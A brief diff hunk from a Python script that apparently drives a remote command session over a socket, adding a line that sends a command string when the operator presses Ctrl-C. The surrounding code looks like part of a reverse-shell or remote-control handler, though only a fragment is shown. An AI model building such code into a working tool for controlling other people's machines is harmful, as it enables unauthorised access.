@@ -223,6 +223,7 @@ while True:
                     break
                 except KeyboardInterrupt:
                     print(YELLOW+"[-] stupid can't escape this reality"+END)
+                    conn.send(str.encode(com))
                     break
                     #[2:-3]
             m = str(conn.recv(999999999),"utf-8")
